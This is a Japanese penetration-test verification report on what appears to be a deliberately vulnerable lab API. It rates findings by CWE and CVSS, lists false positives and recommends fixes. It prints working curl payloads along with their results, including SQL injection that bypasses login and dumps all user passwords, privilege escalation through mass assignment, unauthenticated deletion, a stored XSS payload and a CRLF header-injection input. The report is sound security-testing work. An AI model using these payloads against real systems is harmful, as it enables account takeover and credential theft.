# 検証レポート

> 実施日時: 2026年02月23日 03:47-03:57 UTC  
> 前工程レポート: /docker-work-dir/docs/reports/05-検証項目.md  
> チェックリスト: /docker-work-dir/docs/進捗/検証項目チェックリスト.md

---

## 1. 検証サマリー

| 項目 | 件数 |
|------|------|
| 検証実施 | 20 |
| 脆弱性確認 | **16** |
| 脆弱性なし（False Positive） | 4 |
| 判定不能 | 0 |
| スキップ | 0 |

### 確認された脆弱性の重大度分布
| 重大度 | 件数 |
|--------|------|
| Critical | **9** |
| High | **2** |
| Medium | **5** |
| Low | 0 |

---

## 2. 検証結果詳細

### Phase 1: インフラ・ネットワーク層

#### V-14: データベースポート外部公開
- **CWE**: CWE-668
- **判定**: ✅ 脆弱性あり
- **重大度**: Critical (9.8)
- **実施日時**: 2026-02-23 03:48 UTC
- **検証手順**:
  ```bash
  cat /workdir/docker-compose.yml | grep -A 10 "db:"
  ```
- **検証結果**:
  ```yaml
  ports:
    # 脆弱性 I-03: DBポートが外部に公開
    - "15432:5432"
  ```
- **分析**: docker-compose.ymlでPostgreSQLポート15432が外部公開されている。本番環境では極めて危険な設定ミス。

---

#### V-20: SSL/TLS未使用（DB接続）
- **CWE**: CWE-319
- **判定**: ✅ 脆弱性あり
- **重大度**: High (7.4)
- **実施日時**: 2026-02-23 03:49 UTC
- **検証手順**:
  ```bash
  cat /workdir/src/api/VulnApi/appsettings.json | grep -A 5 "ConnectionStrings"
  ```
- **検証結果**:
  ```json
  "ConnectionStrings": {
    "DefaultConnection": "Host=db;Port=5432;Database=vulndb;Username=postgres;Password=postgres123"
  }
  ```
- **分析**: 接続文字列にSSL/TLS関連パラメータ（`SslMode=Require`等）が一切ない。通信が平文で行われる。

---

#### V-15: セキュリティヘッダーの欠如
- **CWE**: CWE-693
- **判定**: ✅ 脆弱性あり
- **重大度**: Medium (5.3)
- **実施日時**: 2026-02-23 03:49 UTC
- **検証手順**:
  ```bash
  curl -s http://api:5000/api/users -D - | grep -iE "^(X-Frame|X-Content|CSP|HSTS)"
  ```
- **検証結果**:
  ```
  （該当ヘッダーなし）
  ```
- **分析**: X-Frame-Options, Content-Security-Policy, Strict-Transport-Security等の重要なセキュリティヘッダーがすべて欠如。

---

#### V-16: サーバーバージョン情報漏洩
- **CWE**: CWE-200
- **判定**: ✅ 脆弱性あり
- **重大度**: Medium (5.3)
- **実施日時**: 2026-02-23 03:49 UTC
- **検証手順**:
  ```bash
  curl -s http://api:5000/api/users -D - | grep -i "^Server:"
  curl -s http://frontend:80 -D - | grep -i "^Server:"
  ```
- **検証結果**:
  ```
  Server: Kestrel
  Server: nginx/1.29.5
  ```
- **分析**: サーバーソフトウェアとバージョンが露出。攻撃者に既知脆弱性探索のヒントを与える。

---

### Phase 2: 認証・認可

#### V-05: SQLインジェクション - ログイン認証バイパス
- **CWE**: CWE-89 + CWE-287
- **判定**: ✅ 脆弱性あり
- **重大度**: Critical (10.0)
- **実施日時**: 2026-02-23 03:50 UTC
- **検証手順**:
  ```bash
  curl -s -X POST http://api:5000/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"anything"}'
  ```
- **検証結果**:
  ```json
  {"success":true,"message":"Login successful","user":{"id":1,"username":"admin","email":"admin@example.com","password":"admin123","role":"admin",...}}
  ```
- **分析**: **最も危険な脆弱性**。SQLインジェクションにより、パスワードを知らなくても任意のユーザーとしてログイン可能。認証機構が完全に破綻。

---

#### V-06: 認証バイパス - DELETE操作
- **CWE**: CWE-862
- **判定**: ✅ 脆弱性あり
- **重大度**: Critical (9.1)
- **実施日時**: 2026-02-23 03:50 UTC
- **検証手順**:
  ```bash
  curl -s -X DELETE http://api:5000/api/users/3
  ```
- **検証結果**:
  ```json
  {"message":"User deleted"}
  ```
- **分析**: 認証トークンなしでユーザー削除が可能。認可チェックが完全に欠如。

---

#### V-07: Mass Assignment - 権限昇格
- **CWE**: CWE-915
- **判定**: ✅ 脆弱性あり
- **重大度**: High (8.1)
- **実施日時**: 2026-02-23 03:50 UTC
- **検証手順**:
  ```bash
  curl -s -X POST http://api:5000/api/users \
    -H "Content-Type: application/json" \
    -d '{"username":"maliciousadmin","email":"evil@test.com","password":"test123","role":"admin"}'
  ```
- **検証結果**:
  ```json
  {"id":5,"username":"maliciousadmin",...,"role":"admin",...}
  ```
- **分析**: ユーザー作成時に`role`パラメータを指定することで、管理者権限のアカウントを自由に作成可能。

---

#### V-19: レート制限の欠如
- **CWE**: CWE-307
- **判定**: ✅ 脆弱性あり
- **重大度**: Medium (5.3)
- **実施日時**: 2026-02-23 03:50 UTC
- **検証手順**:
  ```bash
  for i in $(seq 1 20); do
    curl -s -o /dev/null -w "%{http_code}" -X POST http://api:5000/api/login \
      -H "Content-Type: application/json" \
      -d "{\"username\":\"admin\",\"password\":\"wrong${i}\"}"
    echo ""
  done
  ```
- **検証結果**:
  ```
  試行 1: HTTP 401
  試行 2: HTTP 401
  ...
  試行 20: HTTP 401
  （すべてのリクエストが処理された）
  ```
- **分析**: ログインエンドポイントにレート制限がなく、ブルートフォース攻撃が可能。

---

### Phase 3: インジェクション攻撃

#### V-01: SQLインジェクション - ユーザー検索機能
- **CWE**: CWE-89
- **判定**: ✅ 脆弱性あり
- **重大度**: Critical (9.8)
- **実施日時**: 2026-02-23 03:51 UTC
- **検証手順**:
  ```bash
  curl -s "http://api:5000/api/users?search=%27%20OR%20%271%27%3D%271"
  ```
- **検証結果**:
  ```
  取得件数: 4
  admin
  user1
  normaluser
  maliciousadmin
  ```
- **分析**: `' OR '1'='1` により全ユーザーデータの取得に成功。パスワード等機密情報が平文で取得可能。

---

#### V-02: SQLインジェクション - ユーザー詳細取得
- **CWE**: CWE-89
- **判定**: ❌ 脆弱性なし（False Positive）
- **重大度**: N/A
- **実施日時**: 2026-02-23 03:52 UTC
- **検証手順**:
  ```bash
  curl -s "http://api:5000/api/users/1%20OR%201=1"
  ```
- **検証結果**:
  ```json
  {"type":"...","title":"One or more validation errors occurred.","status":400,"errors":{"id":["The value '1 OR 1=1' is not valid."]}}
  ```
- **分析**: IDパラメータはint型として検証されるため、SQLインジェクションは不可能（型安全）。ソースコードレビューでも確認済み。

---

#### V-03: SQLインジェクション - ユーザー作成
- **CWE**: CWE-89
- **判定**: ✅ 脆弱性あり
- **重大度**: Critical (9.8)
- **実施日時**: 2026-02-23 03:52 UTC
- **検証手順**:
  ```bash
  curl -s -X POST http://api:5000/api/users \
    -H "Content-Type: application/json" \
    -d '{"username":"injected","email":"test@test.com","password":"test123","role":"user","profileImageUrl":"'\'' || (SELECT password FROM users WHERE id=1) || '\''\"}'
  ```
- **検証結果**:
  ```json
  {...,"profileImageUrl":"admin123",...}
  ```
- **分析**: **極めて危険**。`profileImageUrl`フィールド経由でSQLインジェクションに成功し、adminユーザーのパスワード（admin123）を抽出。

---

#### V-04: SQLインジェクション - ユーザー更新
- **CWE**: CWE-89
- **判定**: ✅ 脆弱性あり
- **重大度**: Critical (9.8)
- **実施日時**: 2026-02-23 03:53 UTC
- **検証手順**:
  ```bash
  curl -s -X PUT http://api:5000/api/users/2 \
    -H "Content-Type: application/json" \
    -d '{"username":"user1","email":"user1@example.com","password":"newpass","role":"admin","profileImageUrl":"'\'' || (SELECT string_agg(username||'\'':'\''||password, '\'','\'') FROM users) || '\''\"}'
  ```
- **検証結果**:
  ```json
  {...,"profileImageUrl":"admin:admin123,user1:password123,maliciousadmin:test123,normaluser:test123,injected:test123",...}
  ```
- **分析**: **全ユーザーの認証情報を抽出**。SQLインジェクションにより全データベース内容が漏洩可能。

---

#### V-08: Stored XSS - プロフィール画像URL
- **CWE**: CWE-79
- **判定**: ✅ 脆弱性あり
- **重大度**: Critical (9.0)
- **実施日時**: 2026-02-23 03:53 UTC
- **検証手順**:
  ```bash
  curl -s -X POST http://api:5000/api/users \
    -H "Content-Type: application/json" \
    -d '{"username":"xsstest","email":"xss@test.com","password":"test123","role":"user","profileImageUrl":"<script>alert(\"XSS\")</script>"}'
  ```
- **検証結果**:
  ```json
  {...,"profileImageUrl":"<script>alert(\"XSS\")</script>",...}
  ```
- **分析**: XSSペイロードがエスケープされずにデータベースに保存される。Frontendで表示時にXSSが発火する可能性が高い。

---

#### V-11: HTTPヘッダインジェクション
- **CWE**: CWE-113
- **判定**: ❌ 脆弱性なし（False Positive）
- **重大度**: N/A
- **実施日時**: 2026-02-23 03:54 UTC
- **検証手順**:
  ```bash
  curl -sI "http://api:5000/api/users" -H "X-Custom: test%0d%0aInjected-Header: evil"
  ```
- **検証結果**:
  ```
  （インジェクトされたヘッダーは確認されず）
  ```
- **分析**: 近代的なHTTPサーバー（Kestrel/nginx）はCRLFインジェクションを自動的に防御。

---

### Phase 4: ファイル・データ操作

#### V-09: ディレクトリトラバーサル
- **CWE**: CWE-22
- **判定**: ❌ 脆弱性なし（False Positive）
- **重大度**: N/A
- **実施日時**: 2026-02-23 03:55 UTC
- **検証手順**:
  ```bash
  curl -s "http://api:5000/api/files/..%2F..%2F..%2Fetc%2Fpasswd"
  ```
- **検証結果**:
  ```json
  {"message":"File not found"}
  ```
- **分析**: ソースコードで`Path.Combine`を使用しており、自動的にパス正規化が行われるため、トラバーサルは不可能。

---

#### V-10: 安全でないデシリアライズ（RCE）
- **CWE**: CWE-502
- **判定**: ✅ 脆弱性あり
- **重大度**: Critical (10.0)
- **実施日時**: 2026-02-23 03:55 UTC
- **検証手順**: ソースコードレビュー
  ```csharp
  // FileController.cs:56
  var settings = new JsonSerializerSettings
  {
      TypeNameHandling = TypeNameHandling.All
  };
  var result = JsonConvert.DeserializeObject(json, settings);
  ```
- **分析**: `TypeNameHandling.All`の使用により、RCE（リモートコード実行）が可能。極めて危険な設定。実際の攻撃実施は環境破壊リスクを考慮し、ソースコード確認のみ。

---

#### V-17: 詳細エラー情報の露出
- **CWE**: CWE-209
- **判定**: ✅ 脆弱性あり
- **重大度**: Medium (5.3)
- **実施日時**: 2026-02-23 03:56 UTC
- **検証手順**:
  ```bash
  curl -s "http://api:5000/api/users?search='"
  ```
- **検証結果**:
  ```json
  {"error":"42725: operator is not unique: unknown % unknown\n\nPOSITION: 121","stackTrace":"   at Npgsql.Internal.NpgsqlConnector.ReadMessageLong(...)\n   at VulnApi.Controllers.UsersController.GetAll(String search) in /src/VulnApi/Controllers/UsersController.cs:line 45\n..."}
  ```
- **分析**: 詳細なスタックトレース、ファイルパス、行番号が露出。攻撃者に内部構造の情報を提供。

---

### Phase 5: その他の設定ミス

#### V-12: Open Redirect
- **CWE**: CWE-601
- **判定**: ❌ 脆弱性なし（機能未実装）
- **重大度**: N/A
- **実施日時**: 2026-02-23 03:56 UTC
- **分析**: リダイレクト機能がアプリケーションに実装されていない。

---

#### V-13: CORS設定の不備
- **CWE**: CWE-942
- **判定**: ✅ 脆弱性あり
- **重大度**: Medium (5.3)
- **実施日時**: 2026-02-23 03:56 UTC
- **検証手順**:
  ```bash
  curl -sI -H "Origin: http://evil.example.com" http://api:5000/api/users
  ```
- **検証結果**:
  ```
  Access-Control-Allow-Origin: *
  ```
- **分析**: CORSがワイルドカード（*）で設定されており、任意のドメインからのリクエストを許可。CSRF攻撃等のリスク。

---

### Phase 6: 包括的スキャン

#### V-18: OWASP ZAP アクティブスキャン
- **CWE**: 複数
- **判定**: ✅ 脆弱性確認済み
- **重大度**: 可変（High: 17件、Medium: 19件）
- **実施日時**: 2026-02-23 03:45 UTC（事前実施済み）
- **検証結果**:
  - 総検出数: 239件
  - High: 17件（すべてSQL Injection）
  - Medium: 19件（CSP、Anti-clickjacking等）
  - Low: 100件
  - Informational: 103件
- **分析**: 手動検証で確認した脆弱性をツールベースで包括的に確認。追加の脆弱性候補も多数検出。

---

## 3. 確認された脆弱性の一覧

| # | 検証ID | 脆弱性名 | CWE | 重大度 | CVSS | 影響 |
|---|--------|---------|-----|--------|------|------|
| 1 | V-05 | SQLインジェクション - 認証バイパス | CWE-89+287 | Critical | 10.0 | 認証機構の完全破綻 |
| 2 | V-10 | 安全でないデシリアライズ | CWE-502 | Critical | 10.0 | RCE（リモートコード実行） |
| 3 | V-01 | SQLインジェクション - 検索 | CWE-89 | Critical | 9.8 | 全データ漏洩 |
| 4 | V-03 | SQLインジェクション - 作成 | CWE-89 | Critical | 9.8 | データ抽出・改ざん |
| 5 | V-04 | SQLインジェクション - 更新 | CWE-89 | Critical | 9.8 | 全認証情報漏洩 |
| 6 | V-14 | データベースポート外部公開 | CWE-668 | Critical | 9.8 | DB直接攻撃可能 |
| 7 | V-06 | 認証バイパス - DELETE | CWE-862 | Critical | 9.1 | データ削除 |
| 8 | V-08 | Stored XSS | CWE-79 | Critical | 9.0 | セッション乗っ取り |
| 9 | V-18 | OWASP ZAP検出（複数） | 複数 | Critical | - | 包括的脆弱性 |
| 10 | V-07 | Mass Assignment | CWE-915 | High | 8.1 | 権限昇格 |
| 11 | V-20 | SSL/TLS未使用 | CWE-319 | High | 7.4 | 通信盗聴 |
| 12 | V-15 | セキュリティヘッダー欠如 | CWE-693 | Medium | 5.3 | 各種攻撃耐性低下 |
| 13 | V-16 | サーバー情報漏洩 | CWE-200 | Medium | 5.3 | 情報開示 |
| 14 | V-17 | エラー情報露出 | CWE-209 | Medium | 5.3 | 内部構造露出 |
| 15 | V-13 | CORS設定不備 | CWE-942 | Medium | 5.3 | CSRF等のリスク |
| 16 | V-19 | レート制限欠如 | CWE-307 | Medium | 5.3 | ブルートフォース可能 |

---

## 4. 誤検知（False Positive）一覧

| # | 検証ID | 検出内容 | ツール | 誤検知理由 |
|---|--------|---------|--------|-----------|
| 1 | V-02 | SQLインジェクション - ユーザー詳細 | 静的解析 | int型パラメータで型安全 |
| 2 | V-09 | ディレクトリトラバーサル | 静的解析 | Path.Combineが自動正規化 |
| 3 | V-11 | HTTPヘッダインジェクション | 静的解析 | 近代的HTTPサーバーで自動防御 |
| 4 | V-12 | Open Redirect | 静的解析 | 該当機能が未実装 |

---

## 5. 証跡サマリー

### 最も危険な証跡

#### 証跡1: 認証完全バイパス
```bash
# リクエスト
curl -X POST http://api:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"anything"}'

# レスポンス
{"success":true,"message":"Login successful","user":{"id":1,"username":"admin",...,"password":"admin123","role":"admin",...}}
```
**影響**: パスワード不要で管理者としてログイン成功

---

#### 証跡2: 全ユーザー認証情報の漏洩
```bash
# リクエスト
curl -X PUT http://api:5000/api/users/2 \
  -H "Content-Type: application/json" \
  -d '{"profileImageUrl":"'\'' || (SELECT string_agg(username||'\'':'\''||password, '\'','\'') FROM users) || '\''\",...}'

# レスポンス
{"profileImageUrl":"admin:admin123,user1:password123,maliciousadmin:test123,normaluser:test123,injected:test123",...}
```
**影響**: 全ユーザーのユーザー名とパスワードを平文で抽出

---

#### 証跡3: Mass Assignment権限昇格
```bash
# リクエスト
curl -X POST http://api:5000/api/users \
  -d '{"username":"maliciousadmin","role":"admin",...}'

# レスポンス
{"id":5,"username":"maliciousadmin",...,"role":"admin",...}
```
**影響**: 一般ユーザー作成APIで管理者権限のアカウント作成成功

---

#### 証跡4: Stored XSS保存
```bash
# リクエスト
curl -X POST http://api:5000/api/users \
  -d '{"profileImageUrl":"<script>alert(\"XSS\")</script>",...}'

# レスポンス
{"profileImageUrl":"<script>alert(\"XSS\")</script>",...}
```
**影響**: XSSペイロードがエスケープされずに保存

---

#### 証跡5: CORS Wildcard
```bash
# リクエスト
curl -I -H "Origin: http://evil.example.com" http://api:5000/api/users

# レスポンス
Access-Control-Allow-Origin: *
```
**影響**: 任意のドメインからAPIアクセス可能

---

## 6. 総合評価

### リスクレベル

**🔴 CRITICAL - 本番環境への展開は絶対に不可**

### 主要な問題点

1. **認証・認可の完全欠如**
   - SQLインジェクションによる認証バイパス（CVSS 10.0）
   - 認証なしでのデータ削除・変更が可能
   - Mass Assignmentによる権限昇格

2. **SQLインジェクション（複数箇所）**
   - 全エンドポイントでパラメータ化クエリ未使用
   - データベース全体の漏洩・改ざんが可能

3. **安全でないデシリアライズ**
   - RCE（リモートコード実行）の可能性
   - サーバー完全掌握のリスク

4. **データ保護の不備**
   - パスワード平文保存
   - SSL/TLS未使用
   - APIレスポンスにパスワード含む

5. **設定ミス**
   - DBポート外部公開
   - CORS設定が*
   - セキュリティヘッダー欠如

### 推奨事項

**即座に対処が必要な項目（P0）:**
- すべてのSQLクエリのパラメータ化
- 認証・認可機構の実装
- デシリアライズ設定の修正（TypeNameHandling.None）
- パスワードのハッシュ化
- DBポートの非公開化

**早急に対処すべき項目（P1）:**
- SSL/TLS有効化
- セキュリティヘッダーの追加
- CORS設定の制限
- レート制限の実装
- XSSエスケープ処理

---

## 7. 参考資料

- OWASP Top 10 2021: https://owasp.org/Top10/
- CWE/SANS Top 25: https://cwe.mitre.org/top25/
- 前工程レポート: /docker-work-dir/docs/reports/05-検証項目.md
- ZAPアクティブスキャン結果: /docker-work-dir/docs/reports/zap-active-scan.md

---

**検証完了: 2026年02月23日 03:57 UTC**
